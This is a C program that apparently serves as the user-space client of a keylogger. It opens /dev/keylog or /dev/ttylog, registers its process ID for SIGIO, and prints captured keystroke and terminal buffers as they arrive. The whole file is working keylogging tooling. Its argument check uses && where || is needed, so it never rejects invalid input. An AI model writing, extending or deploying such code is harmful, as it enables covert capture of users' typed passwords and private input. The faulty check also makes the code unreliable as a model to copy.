#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/select.h>
#include <signal.h>
#include <string.h>

#define CONSOLE 0
#define BUF_SIZE 1024

FILE *fp;
char* read_buf;

void io_ready( int signum ) {
    rewind( fp );
    memset( read_buf, 0, BUF_SIZE );
    fread( read_buf, 1, BUF_SIZE, fp );

    printf( "%s\n", read_buf );
}

int main( int argc, char **argv ) {
    fd_set readset;
    int shouldExit = 0;
 
    if( argc != 2 || (strcmp(argv[1], "key") == 0 && strcmp(argv[1], "tty") == 0) ) {
        perror( argv[1] );
        
        perror( "Usage: keyreader (key|tty)\n" );
        return -1;
    }

    if( strcmp(argv[1], "key") == 0 ) {
        fp = fopen( "/dev/keylog", "r+" );
    }
    else if( strcmp(argv[1], "tty") == 0  ) {
        fp = fopen( "/dev/ttylog", "r+" );
    }
    
    if ( fp == NULL ) {
        perror( "Failed to open keylog file" );
        return -1;
    }

    pid_t this_pid = getpid();

    // Register for IO signals
    fprintf( fp, "%d", this_pid);
    fflush( fp );

    read_buf = (char*) calloc( BUF_SIZE, sizeof(char) );
    if ( read_buf == NULL ) {
        perror( "Failed to allocate file read buffer." );
        return -1;
    }

    signal( SIGIO, io_ready ); // Register for IO signals

    printf( "Listening for keypresses. Press 'q' to exit.\n" );

    FD_ZERO( &readset );
    
    while ( !shouldExit ) {
        FD_SET( CONSOLE, &readset );

        if ( select( 0 + 1, &readset, NULL, NULL, NULL ) != 0 ) {
            if ( FD_ISSET( CONSOLE, &readset ) ) {
                char c = getchar();
                if ( c == 'q' ) {
                    printf( "Exiting...\n" );
                    shouldExit=1;
                }
            }
        }
    }

    if ( read_buf != NULL ) {
        free( read_buf );
    }

    // Unregister for signals
    //  - Sending PID while registered unhooks process from being notified
    fprintf( fp, "%d", this_pid );
    fflush( fp );
    fclose( fp );

    return 0;
}
